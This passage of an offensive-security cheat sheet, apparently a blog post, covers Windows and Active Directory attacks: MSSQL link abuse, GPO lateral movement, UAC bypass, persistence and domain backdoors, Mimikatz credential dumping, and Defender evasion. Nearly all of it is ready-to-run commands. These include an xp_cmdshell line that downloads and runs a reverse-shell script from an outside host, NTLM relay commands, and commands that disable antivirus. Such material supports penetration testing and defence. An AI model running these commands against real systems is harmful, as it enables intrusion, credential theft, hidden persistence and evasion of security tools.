MSSQL databases can be linked, such that if you compromise one you can execute queries (or even OS commands!) on other databases in the context of a specific user (`sa` maybe? 😙). If this is configured, it can even be used to traverse Forest boundaries! If we have SQL execution, we can use the following commands to enumerate database links.

```sql
-- Find linked servers
EXEC sp_linkedservers

-- Run SQL query on linked server
select mylogin from openquery("TARGETSERVER", 'select SYSTEM_USER as mylogin')

-- Enable 'xp_cmdshell' on remote server and execute commands, only works if RPC is enabled
EXEC ('sp_configure ''show advanced options'', 1; reconfigure') AT TARGETSERVER
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure') AT TARGETSERVER
EXEC ('xp_cmdshell ''whoami'' ') AT TARGETSERVER
```

We can also use [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) to look for databases within the domain, and gather further information on (reachable) databases. We can also automatically look for, and execute queries or commands on, linked databases (even through multiple layers of database links).

```powershell
# Get MSSQL databases in the domain, and test connectivity
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ft

# Try to get information on all domain databases
Get-SQLInstanceDomain | Get-SQLServerInfo

# Get information on a single reachable database
Get-SQLServerInfo -Instance TARGETSERVER

# Scan for MSSQL misconfigurations to escalate to SA
Invoke-SQLAudit -Verbose -Instance TARGETSERVER

# Execute SQL query
Get-SQLQuery -Query "SELECT system_user" -Instance TARGETSERVER

# Run command (enables XP_CMDSHELL automatically if required)
Invoke-SQLOSCmd -Instance TARGETSERVER -Command "whoami" |  select -ExpandProperty CommandResults

# Automatically find all linked databases
Get-SqlServerLinkCrawl -Instance TARGETSERVER | select instance,links | ft

# Run command if XP_CMDSHELL is enabled on any of the linked databases
Get-SqlServerLinkCrawl -Instance TARGETSERVER -Query 'EXEC xp_cmdshell "whoami"' | select instance,links,customquery | ft

Get-SqlServerLinkCrawl -Instance TARGETSERVER -Query 'EXEC xp_cmdshell "powershell.exe -c iex (new-object net.webclient).downloadstring(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1'')"' | select instance,links,customquery | ft
```

If you have low-privileged access to a MSSQL database and no links are present, you could potentially force NTLM authentication by using the `xp_dirtree` stored procedure to access this share. If this is successful, the NetNTLM for the SQL service account can be collected and potentially cracked or relayed to compromise machines as that service account.

```sql
EXEC master..xp_dirtree "\\192.168.49.67\share"
```

Example command to relay the hash to authenticate as local admin (if the service account has these privileges) and run `calc.exe`. Omit the `-c` parameter to attempt a `secretsdump` instead.

```bash
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.67.6 -c 'calc.exe'
```

### Abusing Group Policy Objects for lateral movement

If we identify that we have the permissions to edit and link new Group Policy Objects (GPOs) within the domain (refer to ['AD Enumeration With PowerView']({{<ref "#ad-enumeration-with-powerview" >}})), we can abuse these privileges to move laterally towards other machines.

As an example, we can use the legitimate [Remote System Administration Tools](https://docs.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/remote-server-administration-tools) (RSAT) for Windows to create a new GPO, link it to the target, and deploy a registry runkey to add a command that will run automatically the next time the machine boots.

```powershell
# Create a new GPO and link it to the target server
New-GPO -Name 'Totally Legit GPO' | New-GPLink -Target 'OU=TargetComputer,OU=Workstations,DC=TargetDomain,DC=com'

# Link an existing GPO to another target server
New-GPLink -Target 'OU=TargetComputer2,OU=Workstations,DC=TargetDomain,DC=com' -Name 'Totally Legit GPO'

# Deploy a registry runkey via the GPO
Set-GPPrefRegistryValue -Name 'Totally Legit GPO' -Context Computer -Action Create -Key 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' -ValueName 'Updater' -Value 'cmd.exe /c calc.exe' -Type ExpandString
```

We can also use [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) to deploy an immediate scheduled task, which will run whenever the group policy is refreshed (every 1-2 hours by default). SharpGPOABuse does not create its own GPO objects, so we first have to run the commands for creating and linking GPOs listed above. After this, we can run SharpGPOAbuse to deploy the immediate task.

```powershell
SharpGPOAbuse.exe --AddComputerTask --TaskName "Microsoft LEGITIMATE Hotfix" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c start calc.exe" --GPOName "Totally Legit GPO"
```

## Privilege Escalation

For more things to look for (both Windows and Linux), refer to my [OSCP cheat sheet and command reference](https://cas.vancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/).

### PowerUp

```powershell
# Check for vulnerable programs and configs
Invoke-AllChecks

# Exploit vulnerable service permissions (does not require touching disk)
Invoke-ServiceAbuse -Name "VulnerableSvc" -Command "net localgroup Administrators DOMAIN\user /add"

# Exploit an unquoted service path vulnerability to spawn a beacon
Write-ServiceBinary -Name 'VulnerableSvc' -Command 'c:\windows\system32\rundll32 c:\Users\Public\beacon.dll,Update' -Path 'C:\Program Files\VulnerableSvc'

# Restart the service to exploit (not always required)
net.exe stop VulnerableSvc
net.exe start VulnerableSvc
```

### UAC Bypass

Using [SharpBypassUAC](https://github.com/FatRodzianko/SharpBypassUAC).

```bash
# Generate EncodedCommand
echo -n 'cmd /c start rundll32 c:\\users\\public\\beacon.dll,Update' | base64

# Use SharpBypassUAC e.g. from a CobaltStrike beacon
beacon> execute-assembly /opt/SharpBypassUAC/SharpBypassUAC.exe -b eventvwr -e Y21kIC9jIHN0YXJ0IHJ1bmRsbDMyIGM6XHVzZXJzXHB1YmxpY1xiZWFjb24uZGxsLFVwZGF0ZQ==
```

In some cases, you may get away better with running a manual UAC bypass, such as the FODHelper bypass which is quite simple to execute in PowerShell.

```powershell
# The command to execute in high integrity context
$cmd = "cmd /c start powershell.exe"
 
# Set the registry values
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $cmd -Force
 
# Trigger fodhelper to perform the bypass
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 
# Clean registry
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

## Persistence

### Startup folder

Just drop a binary. Classic. 😎🚩

In current user folder, will trigger when current user signs in:

```plaintext
c:\Users\[USERNAME]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

Or in the global startup folder, requires administrative privileges but will trigger as SYSTEM on boot *and*  in a user context whenever any user signs in:

```plaintext
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

## Domain Persistence

Must be run with DA privileges.

### Mimikatz skeleton key attack

Run from DC. Enables password "mimikatz" for all users. 🚩

```plaintext
privilege::debug
misc::skeleton
```

### Grant specific user DCSync rights with PowerView

Gives a user of your choosing the rights to DCSync at any time. May evade detection in some setups.

```powershell
Add-ObjectACL -TargetDistinguishedName "dc=targetdomain,dc=com" -PrincipalSamAccountName BackdoorUser -Rights DCSync
``` 

### Domain Controller DSRM admin

The DSRM admin is the local administrator account of the DC. Remote logon needs to be enabled first.

```powershell
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

Now we can login remotely using the local admin hash dumped on the DC before (with `lsadump::sam`, see ['Dumping secrets with Mimikatz']({{<ref "#dumping-secrets-with-mimikatz" >}}) below). Use e.g. 'overpass-the-hash' to get a session (see ['Mimikatz']({{<ref "#mimikatz" >}}) above).

### Modifying security descriptors for remote WMI access

Give user WMI access to a machine, using [Set-RemoteWMI](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1) cmdlet from Nishang. Can be run to persist access to e.g. DCs.

```powershell
Set-RemoteWMI -UserName BackdoorUser -ComputerName dc.targetdomain.com -namespace 'root\cimv2'
```

For execution, see ['Command execution with WMI']({{<ref "#command-execution-with-wmi" >}}) above.

### Modifying security descriptors for PowerShell Remoting access

Give user PowerShell Remoting access to a machine, using [Set-RemotePSRemoting.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemotePSRemoting.ps1) cmdlet from Nishang. Can be run to persist access to e.g. DCs.

```powershell
Set-RemotePSRemoting -UserName BackdoorUser -ComputerName dc.targetdomain.com
```

For execution, see ['Command execution with PowerShell Remoting']({{<ref "#command-executin-with-powershell-remoting" >}}) above.

### Modifying DC registry security descriptors for remote hash retrieval using DAMP

Using [DAMP toolkit](https://github.com/HarmJ0y/DAMP), we can backdoor the DC registry to give us access on the `SAM`, `SYSTEM`, and `SECURITY` registry hives. This allows us to remotely dump DC secrets (hashes).

We add the backdoor using the `Add-RemoteRegBackdoor.ps1` cmdlet from DAMP.

```powershell
Add-RemoteRegBackdoor -ComputerName dc.targetdomain.com -Trustee BackdoorUser
```

Dump secrets remotely using the `RemoteHashRetrieval.ps1` cmdlet from DAMP (run as 'BackdoorUser' user).

```powershell
# Get machine account hash for silver ticket attack
Get-RemoteMachineAccountHash -ComputerName DC01

# Get local account hashes
Get-RemoteLocalAccountHash -ComputerName DC01

# Get cached credentials (if any)
Get-RemoteCachedCredential -ComputerName DC01
```

### DCShadow

DCShadow is an attack that masks certain actions by temporarily imitating a Domain Controller. If you have Domain Admin or Enterprise Admin privileges in a root domain, it can be used for forest-level persistence.

Optionally, as Domain Admin, give a chosen user the privileges required for the DCShadow attack (uses `Set-DCShadowPermissions.ps1` cmdlet).

```powershell
Set-DCShadowPermissions -FakeDC BackdoorMachine -SamAccountName TargetUser -Username BackdoorUser -Verbose
```

Then, from any machine, use Mimikatz to stage the DCShadow attack.

```plaintext
# Set SPN for user
lsadump::dcshadow /object:TargetUser /attribute:servicePrincipalName /value:"SuperHacker/ServicePrincipalThingey"

# Set SID History for user (effectively granting them Enterprise Admin rights)
lsadump::dcshadow /object:TargetUser /attribute:SIDHistory /value:S-1-5-21-280534878-1496970234-700767426-519

# Set Full Control permissions on AdminSDHolder container for user
## Requires retrieval of current ACL:
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC=targetdomain,DC=com")).psbase.ObjectSecurity.sddl

## Then get target user SID:
Get-NetUser -UserName BackdoorUser | select objectsid

## Finally, add full control primitive (A;;CCDCLCSWRPWPLOCRRCWDWO;;;[SID]) for user
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=targetdomain,DC=com /attribute:ntSecurityDescriptor /value:O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)[...currentACL...](A;;CCDCLCSWRPWPLOCRRCWDWO;;;[[S-1-5-21-1874506631-3219952063-538504511-45109]])
```

Finally, from either a DA session OR a session as the user provided with the DCShadow permissions before, run the DCShadow attack. Actions staged previously will be performed without leaving any logs 😈

```plaintext
lsadump::dcshadow /push
```

## Post-Exploitation

### LSASS protection

Sometimes, LSASS is configured to run as a protected process (PPL). You can query this with PowerShell as follows.

```powershell
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL" 
```

If this is the case, you can't just dump or parse LSASS, and you need to disable the protection with something like `mimidrv.sys`. I won't discuss how to do that here, but there are tools such as [PPLDump](https://github.com/itm4n/PPLdump) available to help.

### Dumping OS credentials with Mimikatz

```plaintext
# Dump logon passwords
sekurlsa::logonpasswords

# Dump all domain hashes from a DC
## Note: Everything with /patch is noisy as heck since it writes to LSASS 🚩
lsadump::lsa /patch

# Dump only local users
lsadump::sam

# DCSync (requires 'ldap' SPN)
lsadump::dcsync /user:DOMAIN\krbtgt /domain:targetdomain.com

# Dump Windows secrets, such as stored creds for scheduled tasks (elevate first) 🚩
vault::list
vault::cred /patch

# Dump Kerberos encryption keys, including the AES256 key for better opsec (see 'Lateral Movement with Rubeus' section) 
sekurlsa::ekeys
```

### Abusing the Data Protection API (DPAPI) with Mimikatz

Mimikatz has quite some functionality to access Windows' DPAPI, which is used to encrypt many credentials, including e.g. browser passwords.

Note that Mimikatz will automatically cache the master keys that it has seen (check cache with `dpapi::cache`), but this does *NOT* work if no Mimikatz session is persisted (e.g. in Cobalt Strike or when using `Invoke-Mimikatz`). More information on using Mimikatz for DPAPI is available [here](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials).

```plaintext
# Find the IDs of protected secrets for a specific user
dir C:\Users\[USERNAME]\AppData\Local\Microsoft\Credentials

# Get information, including the used master key ID, from a specific secret (take the path from above)
dpapi::cred /in:C:\Users\[USERNAME]\AppData\Local\Microsoft\Credentials\1EF01CC92C17C670AC9E57B53C9134F3

# IF YOU ARE PRIVILEGED
# Dump all master keys from the current system
sekurlsa::dpapi

# IF YOU ARE NOT PRIVILEGED (session as target user required)
# Get the master key from the domain using RPC (the path contains the user SID, and then the ID of the masterkey identified in the previous step)
dpapi::masterkey /rpc /in:C:\Users\[USERNAME]\AppData\Roaming\Microsoft\Protect\S-1-5-21-3865823697-1816233505-1834004910-1124\dd89dddf-946b-4a80-9fd3-7f03ebd41ff4

# Decrypt the secret using the retrieved master key
# Alternatively, leave out /masterkey and add /unprotect to decrypt the secret using the cached master key (see above for caveats)
dpapi::cred /in:C:\Users\[USERNAME]]\AppData\Local\Microsoft\Credentials\1EF01CC92C17C670AC9E57B53C9134F3 /masterkey:91721d8b1ec[...]e0f02c3e44deece5f318ad
```

### Dumping secrets without Mimikatz

We can also parse system secrets without using Mimikatz on the target system directly. 

#### Dumping LSASS

The preferred way to run Mimikatz is to do it locally with a dumped copy of LSASS memory from the target. [Dumpert](https://github.com/outflanknl/Dumpert), [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), or other (custom) tooling can be used to dump LSASS memory.

```powershell
# Dump LSASS memory through a process snapshot (-r), avoiding interacting with it directly
.\procdump.exe -r -ma lsass.exe lsass.dmp
```

After downloading the memory dump file on our attacking system, we can run Mimikatz and switch to 'Minidump' mode to parse the file as follows. After this, we can run Mimikatz' credential retrieval commands as usual.

```plaintext
sekurlsa::minidump lsass.dmp
```

#### Dumping secrets from the registry

We can dump secrets from the registry and parse the files "offline" to get a list of system secrets. 🚩

On the target, we run the following:

```powershell
reg.exe save hklm\sam c:\users\public\downloads\sam.save
reg.exe save hklm\system c:\users\public\downloads\system.save
reg.exe save hklm\security c:\users\public\downloads\security.save
```

Then on our attacking box we can dump the secrets with Impacket:

```bash
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL > secrets.out
```

#### Dumping secrets from a Volume Shadow Copy

We can also create a "Volume Shadow Copy" of the `SAM` and `SYSTEM` files (which are always locked on the current system), so we can still copy them over to our local system. An elevated prompt is required for this.

```powershell
wmic shadowcopy call create Volume='C:\'
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\public\sam.save
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\public\system.save
```

### Windows Defender evasion

*Note: All below commands require administrative privileges on the system!*

You can query Defender exclusions using PowerShell. If it returns any excluded paths, just execute your malware from there!

```powershell
Get-MpPreference | select-object -ExpandProperty ExclusionPath
```
Alternatively, you could add an exclusion directory for your shady stuff. 👀

```powershell
Add-MpPreference -ExclusionPath "C:\Users\Public\Downloads\SuperLegitDownloadDirectory"
```

If you're more aggro, you can disable Defender entirely. It goes without saying that disabling AV/EDR products is never a good idea in practice, best to work around it instead. 🚩

```powershell
# Disable realtime monitoring altogether
Set-MpPreference -DisableRealtimeMonitoring $true

# Only disables scanning for downloaded files or attachments
Set-MpPreference -DisableIOAVProtection $true
```

As an alternative to disabling Defender, you can leave it enabled and just remove all virus signatures from it.

```powershell
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

### Chisel proxying

If you need to proxy traffic over a compromised Windows machine, [Chisel](https://github.com/jpillora/chisel) (or [SharpChisel](https://github.com/shantanu561993/SharpChisel)) is a good choice. Chisel allows port forwarding, but my favorite technique is setting up a reverse SOCKS proxy on the target machine, allowing you to tunnel any traffic over the target system.

On our attacking machine (Linux in this case), we start a Chisel server on port 80 in reverse SOCKS5 mode.

```bash
sudo ./chisel server -p 80 --reverse --socks5
```

Then, on our compromised target system, we connect to this server and tell it to proxy all traffic over it via the reverse SOCKS5 tunnel.

```powershell
.\chisel.exe client 192.168.49.67:80 R:socks
```

A proxy is now open on port 1080 of our linux machine. We can now use e.g. ProxyChains to tunnel over the target system.

### Juicy files

There are lots of files that may contain interesting information. Tools like [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) or collections like [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) may help in identifying juicy files (for privesc or post-exploitation).

Below is a list of some files I have encountered to be of relevance. Check files based on the programs and/or services that are installed on the machine.

> In addition, don't forget to enumerate any local databases with `sqlcmd` or `Invoke-SqlCmd`!

```
# All user folders
## Limit this command if there are too many files ;)
tree /f /a C:\Users

# Web.config
C:\inetpub\www\*\web.config

# Unattend files
C:\Windows\Panther\Unattend.xml

# RDP config files
C:\ProgramData\Configs\

# Powershell scripts/config files
C:\Program Files\Windows PowerShell\

# PuTTy config
C:\Users\[USERNAME]\AppData\LocalLow\Microsoft\Putty

# FileZilla creds
C:\Users\[USERNAME]\AppData\Roaming\FileZilla\FileZilla.xml

# Jenkins creds (also check out the Windows vault, see above)
C:\Program Files\Jenkins\credentials.xml

# WLAN profiles
C:\ProgramData\Microsoft\Wlansvc\Profiles\*.xml

# TightVNC password (convert to Hex, then decrypt with e.g.: https://github.com/frizb/PasswordDecrypts)
Get-ItemProperty -Path HKLM:\Software\TightVNC\Server -Name "Password" | select -ExpandProperty Password
```